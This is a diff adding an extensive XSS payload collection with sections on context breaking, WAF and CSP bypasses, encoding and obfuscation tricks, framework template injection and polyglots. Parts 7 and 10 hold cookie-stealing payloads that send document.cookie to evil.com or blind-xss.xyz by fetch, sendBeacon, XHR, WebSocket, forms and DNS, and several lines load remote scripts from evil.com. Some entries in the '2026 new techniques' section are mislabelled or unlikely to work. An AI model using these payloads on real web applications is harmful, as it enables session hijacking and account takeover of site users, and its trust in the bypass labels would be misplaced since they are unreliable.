@@ -1,0 +1,497 @@
+<!-- ==================== PART 1: CONTEXT BREAKING TECHNIQUES ==================== -->
+
+<!-- 1.1 Basic Context Breakers -->
+"><script>alert(1)</script>
+';alert(1);//
+"><img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)
+"><svg onload=alert(1)>
+"><body onload=alert(1)>
+"><input onfocus=alert(1) autofocus>
+"><details open ontoggle=alert(1)>
+
+<!-- 1.2 Advanced Context Breakers -->
+">'+alert(1)+'
+">';alert(1)// 
+">');alert(1);//
+">]';alert(1);//
+">]}';alert(1);//
+">`;alert(1);//
+">${alert(1)}//
+">\x3cscript\x3ealert(1)\x3c/script\x3e
+">\u003cscript\u003ealert(1)\u003c/script\u003e
+">\x3csvg/onload=alert(1)\x3e
+123';alert(1);//
+123"';alert(1);//
+123`;alert(1);//
+123');alert(1);//
+123");alert(1);//
+123`);alert(1);//
+123]');alert(1);//
+123]}');alert(1);//
+
+<!-- 1.3 Template Literal Injection -->
+${alert(1)}
+${`alert(1)`}
+${eval('alert(1)')}
+${document.location='https://evil.com?c='+document.cookie}
+${window.location='https://evil.com?c='+document.cookie}
+${function(){alert(1)}()}
+${(()=>alert(1))()}
+${fetch('https://evil.com?c='+document.cookie)}
+
+<!-- ==================== PART 2: WAF BYPASS TECHNIQUES ==================== -->
+
+<!-- 2.1 Case Manipulation -->
+<ScRiPt>alert(1)</ScRiPt>
+<SVG/OnLoAd=alert(1)>
+<IMG SrC=x OnErRoR=alert(1)>
+<BoDy OnLoAd=alert(1)>
+<InPuT OnFoCuS=alert(1) AuToFoCuS>
+<DeTaIlS Open OnToGgLe=alert(1)>
+
+<!-- 2.2 Double/Triple Nesting -->
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<scri</script>pt>alert(1)</scri</script>pt>
+<<script>alert(1)</script>
+<<<script>alert(1)</script>>
+<svg<svg/onload=alert(1)>>
+<scr%00ipt>alert(1)</scr%00ipt>
+<scri%00pt>alert(1)</scri%00pt>
+
+<!-- 2.3 Null Byte & Control Characters -->
+<svg%00onload=alert(1)>
+<svg%09onload=alert(1)>
+<svg%0Aonload=alert(1)>
+<svg%0Bonload=alert(1)>
+<svg%0Conload=alert(1)>
+<svg%0Donload=alert(1)>
+<svg%20onload=alert(1)>
+<svg%2Fonload=alert(1)>
+<svg%5Conload=alert(1)>
+
+<!-- 2.4 Whitespace Variants -->
+<svg
+onload=alert(1)>
+<svg	onload=alert(1)>
+<svg
+onload=alert(1)//
+<svg/onload/=/=alert(1)>
+<svg onload = alert(1)>
+<svg onload=alert(1) >
+<svg onload=alert(1)//
+<svg onload='alert(1)'>
+<svg onload="alert(1)">
+
+<!-- 2.5 HTML Entity Encoding -->
+&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#x3C;svg/onload=alert(1)&#x3E;
+&#60;svg/onload=alert(1)&#62;
+
+<!-- 2.6 Hex Encoding -->
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\x3csvg/onload=alert(1)\x3e
+\x3cimg src=x onerror=alert(1)\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\u003csvg/onload=alert(1)\u003e
+
+<!-- 2.7 Octal Encoding -->
+\74script\76alert(1)\74/script\76
+\74svg/onload=alert(1)\76
+
+<!-- 2.8 Unicode Encoding -->
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg/onload=alert(1)%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+
+<!-- 2.9 Double URL Encoding -->
+%253Cscript%253Ealert(1)%253C/script%253E
+%253Csvg/onload=alert(1)%253E
+
+<!-- 2.10 Mixed Encoding -->
+%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+%3Csvg%2Fonload%3Dalert(1)%3E
+
+<!-- ==================== PART 3: EVENT HANDLERS (ALL 150+) ==================== -->
+
+<!-- 3.1 Mouse Events -->
+onclick=alert(1)
+ondblclick=alert(1)
+onmousedown=alert(1)
+onmouseup=alert(1)
+onmouseenter=alert(1)
+onmouseleave=alert(1)
+onmousemove=alert(1)
+onmouseout=alert(1)
+onmouseover=alert(1)
+oncontextmenu=alert(1)
+
+<!-- 3.2 Keyboard Events -->
+onkeydown=alert(1)
+onkeypress=alert(1)
+onkeyup=alert(1)
+
+<!-- 3.3 Form Events -->
+onfocus=alert(1)
+onblur=alert(1)
+onchange=alert(1)
+oninput=alert(1)
+onreset=alert(1)
+onsubmit=alert(1)
+onselect=alert(1)
+
+<!-- 3.4 Drag & Drop Events -->
+ondrag=alert(1)
+ondragend=alert(1)
+ondragenter=alert(1)
+ondragleave=alert(1)
+ondragover=alert(1)
+ondragstart=alert(1)
+ondrop=alert(1)
+
+<!-- 3.5 Media Events -->
+onabort=alert(1)
+oncanplay=alert(1)
+oncanplaythrough=alert(1)
+ondurationchange=alert(1)
+onemptied=alert(1)
+onended=alert(1)
+onerror=alert(1)
+onloadeddata=alert(1)
+onloadedmetadata=alert(1)
+onloadstart=alert(1)
+onpause=alert(1)
+onplay=alert(1)
+onplaying=alert(1)
+onprogress=alert(1)
+onratechange=alert(1)
+onseeked=alert(1)
+onseeking=alert(1)
+onstalled=alert(1)
+onsuspend=alert(1)
+ontimeupdate=alert(1)
+onvolumechange=alert(1)
+onwaiting=alert(1)
+
+<!-- 3.6 Window Events -->
+onafterprint=alert(1)
+onbeforeprint=alert(1)
+onbeforeunload=alert(1)
+onhashchange=alert(1)
+onload=alert(1)
+onmessage=alert(1)
+onoffline=alert(1)
+ononline=alert(1)
+onpagehide=alert(1)
+onpageshow=alert(1)
+onpopstate=alert(1)
+onresize=alert(1)
+onscroll=alert(1)
+onstorage=alert(1)
+onunload=alert(1)
+
+<!-- 3.7 Clipboard Events -->
+oncopy=alert(1)
+oncut=alert(1)
+onpaste=alert(1)
+
+<!-- 3.8 Touch Events -->
+ontouchstart=alert(1)
+ontouchend=alert(1)
+ontouchmove=alert(1)
+ontouchcancel=alert(1)
+
+<!-- 3.9 Pointer Events -->
+onpointerover=alert(1)
+onpointerenter=alert(1)
+onpointerdown=alert(1)
+onpointermove=alert(1)
+onpointerup=alert(1)
+onpointercancel=alert(1)
+onpointerout=alert(1)
+onpointerleave=alert(1)
+
+<!-- 3.10 Animation Events -->
+onanimationstart=alert(1)
+onanimationend=alert(1)
+onanimationiteration=alert(1)
+ontransitionstart=alert(1)
+ontransitionend=alert(1)
+
+<!-- ==================== PART 4: HTML TAGS VECTORS (100+ TAGS) ==================== -->
+
+<!-- 4.1 Basic HTML Tags -->
+<script>alert(1)</script>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<button onfocus=alert(1) autofocus>
+
+<!-- 4.2 Media Tags -->
+<video onloadstart=alert(1) src=x>
+<audio onloadstart=alert(1) src=x>
+<source src=x onerror=alert(1)>
+<track src=x onerror=alert(1)>
+<embed src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+
+<!-- 4.3 Form Tags -->
+<form onsubmit=alert(1)><input type=submit>
+<isindex type=image src=1 onmouseover=alert(1)>
+<input type=image src=1 onmouseover=alert(1)>
+<input type=text value=x onfocus=alert(1) autofocus>
+
+<!-- 4.4 Iframe & Frame Tags -->
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<frame src="javascript:alert(1)">
+
+<!-- 4.5 Link & Meta Tags -->
+<link rel=stylesheet href="javascript:alert(1)">
+<meta http-equiv="refresh" content="0;javascript:alert(1)">
+<meta charset="x-mac-farsi" content="<script>alert(1)</script>">
+
+<!-- 4.6 Table Tags -->
+<table background="javascript:alert(1)">
+<td background="javascript:alert(1)">
+<tr background="javascript:alert(1)">
+<th background="javascript:alert(1)">
+
+<!-- 4.7 List Tags -->
+<li style="list-style-image:url(javascript:alert(1))">
+<ul style="list-style-image:url(javascript:alert(1))">
+<ol style="list-style-image:url(javascript:alert(1))">
+
+<!-- 4.8 Style Tags -->
+<style>@import 'javascript:alert(1)';</style>
+<style>body{background:url(javascript:alert(1))}</style>
+<style>body{background-image:url(javascript:alert(1))}</style>
+
+<!-- 4.9 Custom/Unknown Tags -->
+<x onmouseover=alert(1)>hover
+<y onpointerover=alert(1)>hover
+<z onclick=alert(1)>click
+<custom onmouseenter=alert(1)>hover
+<anytag onmouseover=alert(1)>hover
+
+<!-- ==================== PART 5: OBFUSCATION TECHNIQUES ==================== -->
+
+<!-- 5.1 Base64 Obfuscation -->
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
+<svg/onload=Function(atob('YWxlcnQoMSk='))()>
+<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>
+
+<!-- 5.2 String.fromCharCode Obfuscation -->
+<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</script>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+
+<!-- 5.3 Array Mapping Obfuscation -->
+<svg/onload=[][map][0](alert(1))>
+<svg/onload=[]['map']['constructor']('alert(1)')()>
+<svg/onload=[1].map(alert)>
+
+<!-- 5.4 Reverse String Obfuscation -->
+<script>eval([...'trala(1)'].reverse().join(''))</script>
+<svg/onload=eval([...'trala(1)'].reverse().join(''))>
+
+<!-- 5.5 Split & Join Obfuscation -->
+<script>eval('a'+'l'+'er'+'t(1)')</script>
+<svg/onload=eval('al'+'er'+'t(1)')>
+<img src=x onerror=eval('al'+'ert(1)')>
+
+<!-- 5.6 Template Literal Obfuscation -->
+<svg/onload=eval(`al${'er'}t(1)`)>
+<svg/onload=eval(`${'alert'}(1)`)>
+<svg/onload=top[`al${'ert'}`](1)>
+
+<!-- 5.7 Window Property Obfuscation -->
+<svg/onload=window['alert'](1)>
+<svg/onload=self['alert'](1)>
+<svg/onload=parent['alert'](1)>
+<svg/onload=top['alert'](1)>
+<svg/onload=globalThis['alert'](1)>
+
+<!-- 5.8 Octal & Hex Function Names -->
+<svg/onload=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>
+<svg/onload=alert('\x31')>
+<svg/onload=eval('\141\154\145\162\164\50\61\51')>
+
+<!-- 5.9 Call/Apply Obfuscation -->
+<svg/onload=alert.call(null,1)>
+<svg/onload=alert.apply(null,[1])>
+<svg/onload=Function.prototype.call.call(alert,window,1)>
+
+<!-- 5.10 Constructor Obfuscation -->
+<svg/onload=[].constructor.constructor('alert(1)')()>
+<svg/onload={}.constructor.constructor('alert(1)')()>
+<svg/onload=window.constructor.constructor('alert(1)')()>
+
+<!-- ==================== PART 6: CSP BYPASS TECHNIQUES ==================== -->
+
+<!-- 6.1 Unsafe Inline Bypass -->
+<script nonce="test">alert(1)</script>
+<script>window.__webpack_nonce__='test';alert(1)</script>
+
+<!-- 6.2 Data URI Bypass -->
+<script src="data:text/javascript,alert(1)"></script>
+<iframe src="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html,<script>alert(1)</script>">
+
+<!-- 6.3 CDN/Whitelist Bypass -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.js"></script>
+<script>$.getScript('https://evil.com/xss.js')</script>
+<script src="https://cdn.jsdelivr.net/npm/xss-payload@latest/payload.js"></script>
+
+<!-- 6.4 JSONP Bypass -->
+<script src="https://api.example.com/callback?callback=alert"></script>
+<script src="https://api.example.com/user?callback=alert(1)"></script>
+
+<!-- 6.5 Link Rel Bypass -->
+<link rel=import href="https://evil.com/xss.html">
+<link rel="prefetch" href="https://evil.com/xss.html">
+
+<!-- 6.6 Base Tag Bypass -->
+<base href="javascript:alert(1)//">
+<base href="https://evil.com/">
+
+<!-- ==================== PART 7: COOKIE STEALING PAYLOADS ==================== -->
+
+<!-- 7.1 Image Cookie Stealing -->
+<img src=x onerror="new Image().src='https://evil.com/steal?c='+document.cookie">
+<img src=x onerror="this.src='https://evil.com/steal?c='+document.cookie">
+<img src=x onerror="location.href='https://evil.com/steal?c='+document.cookie">
+
+<!-- 7.2 Fetch Cookie Stealing -->
+<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+<script>navigator.sendBeacon('https://evil.com/log', document.cookie)</script>
+<script>window.navigator.sendBeacon('https://evil.com/cookie', document.cookie)</script>
+
+<!-- 7.3 XHR Cookie Stealing -->
+<script>var xhr=new XMLHttpRequest();xhr.open('GET','https://evil.com/steal?c='+document.cookie);xhr.send()</script>
+<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://evil.com/steal');xhr.send(document.cookie)</script>
+
+<!-- 7.4 WebSocket Cookie Stealing -->
+<script>var ws=new WebSocket('wss://evil.com');ws.onopen=function(){ws.send(document.cookie)}</script>
+
+<!-- 7.5 Form Submission Cookie Stealing -->
+<script>var f=document.createElement('form');f.action='https://evil.com/steal';f.method='POST';f.innerHTML='<input name="c" value="'+document.cookie+'">';document.body.appendChild(f);f.submit()</script>
+
+<!-- ==================== PART 8: POLYGLOT & UNIVERSAL PAYLOADS ==================== -->
+
+<!-- 8.1 Universal Polyglot -->
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
+
+<!-- 8.2 HTML/JS Polyglot -->
+javascript:"/*'/*`/*\</script><svg/onload=alert(1)>/*</script> */ alert(1)//
+
+<!-- 8.3 Multi-Context Polyglot -->
+<!--><img src=x onerror=alert(1)> -->
+--><img src=x onerror=alert(1)> --
+<BODY ONLOAD=alert(1)><!--"><img src=x onerror=alert(1)>-->
+
+<!-- 8.4 SQL/XSS Polyglot -->
+';alert(1);-- <img src=x onerror=alert(1)>
+';alert(1);//"><img src=x onerror=alert(1)>
+
+<!-- ==================== PART 9: FRAMEWORK SPECIFIC ==================== -->
+
+<!-- 9.1 React JSX -->
+{(()=>alert(1))()}
+{this.props.children}
+{dangerouslySetInnerHTML={{__html:"<img src=x onerror=alert(1)>"}}}
+
+<!-- 9.2 Vue.js -->
+{{constructor.constructor('alert(1)')()}}
+{{_self.constructor.constructor('alert(1)')()}}
+{{this.constructor.constructor('alert(1)')()}}
+
+<!-- 9.3 Angular.js -->
+{{$eval('alert(1)')}}
+{{$eval("alert(1)")}}
+{{$eval('alert(document.cookie)')}}
+
+<!-- 9.4 jQuery -->
+<script>$.globalEval('alert(1)')</script>
+<script>$('body').html('<img src=x onerror=alert(1)>')</script>
+<script>$('<img src=x onerror=alert(1)>')</script>
+
+<!-- 9.5 Angular (2+) -->
+{{constructor.constructor('alert(1)')()}}
+{[constructor.constructor('alert(1)')()]}
+
+<!-- ==================== PART 10: BLIND XSS PAYLOADS ==================== -->
+
+<!-- 10.1 Basic Blind XSS -->
+<script src="https://blind-xss.xyz/xss.js"></script>
+<img src=x onerror="fetch('https://blind-xss.xyz/steal?c='+document.cookie)">
+<svg/onload="navigator.sendBeacon('https://blind-xss.xyz/log', document.cookie)">
+
+<!-- 10.2 Advanced Blind XSS -->
+<script>document.write('<img src=x onerror=fetch("https://blind-xss.xyz/"+document.cookie)>')</script>
+<script>setTimeout(function(){fetch('https://blind-xss.xyz/x?c='+document.cookie)},1000)</script>
+<script>window.onload=function(){fetch('https://blind-xss.xyz/load?c='+document.cookie)}</script>
+
+<!-- 10.3 DNS Exfiltration -->
+<script>var d=document.cookie;var domain='.blind-xss.xyz';var img=new Image();img.src='https://'+d+domain</script>
+<img src=x onerror="location.href='//'+document.cookie+'.blind-xss.xyz'">
+
+<!-- ==================== PART 11: ULTRA SHORT PAYLOADS ==================== -->
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<svg/onload=alert`1`>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<svg/onload=parent.alert(1)>
+<svg/onload=self.alert(1)>
+<svg/onload=top.alert(1)>
+<svg/onload=globalThis.alert(1)>
+<svg/onload=alert(1)//
+<svg/onload=alert()>
+<svg/onload=alert``>
+
+<!-- ==================== PART 12: 2026 NEW TECHNIQUES ==================== -->
+
+<!-- 12.1 Trusted Types Bypass -->
+<script>Element.prototype.setAttribute.toString=function(){alert(1)}</script>
+<script>document.defaultView.alert=alert;document.defaultView.alert(1)</script>
+
+<!-- 12.2 Shadow DOM Payloads -->
+<script>document.body.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>new MutationObserver(()=>{alert(1)}).observe(document.body,{childList:true})</script>
+
+<!-- 12.3 Service Worker XSS -->
+<script>navigator.serviceWorker.register('https://evil.com/sw.js?v='+document.cookie)</script>
+
+<!-- 12.4 Web Worker XSS -->
+<script>var w=new Worker('data:text/javascript,postMessage(document.cookie)');w.onmessage=alert</script>
+
+<!-- 12.5 Cross Origin Opener Policy Bypass -->
+<script>window.open('javascript:alert(1)')</script>
+
+<!-- 12.6 Reporting API Abuse -->
+<script>ReportingObserver.prototype.observe=alert</script>
+
+<!-- 12.7 Module Import -->
+<script type="module">import('data:text/javascript,alert(1)')</script>
+
+<!-- 12.8 Import Maps -->
+<script type="importmap">{}</script>
+<script type="module">import('data:text/javascript,alert(1)')</script>
+
+<!-- 12.9 SRI Hash Bypass -->
+<script integrity="sha384-xxx" src="https://evil.com/payload.js"></script>
+
+<!-- 12.10 COOP/COEP Bypass -->
+<iframe src="javascript:alert(1)" sandbox="allow-same-origin allow-scripts"></iframe>
